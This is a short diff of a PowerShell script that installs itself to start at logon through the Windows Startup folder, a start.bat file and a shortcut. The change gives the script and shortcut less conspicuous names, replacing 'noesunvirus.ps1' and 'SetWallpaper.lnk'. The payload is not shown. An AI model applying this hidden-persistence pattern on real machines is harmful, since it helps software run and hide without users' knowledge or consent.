@@ -1,4 +1,4 @@
-$scriptPath1 = "$env:userprofile\AppData\Local\Temp\noesunvirus.ps1"
+$scriptPath1 = "$env:userprofile\AppData\Local\Temp\set.ps1"
 #$scriptPath2 = "$env:userprofile\Documents\noesunvirus.ps1"
 #$scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1"
 $batFilePath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
@@ -81,7 +81,7 @@ try {
     Write-Host "WMI not available in this environment."
 }
 
-$startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\SetWallpaper.lnk"
+$startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Start.lnk"
 
 if (-not (Test-Path $startupShortcutPath)) {
     $WshShell = New-Object -ComObject WScript.Shell
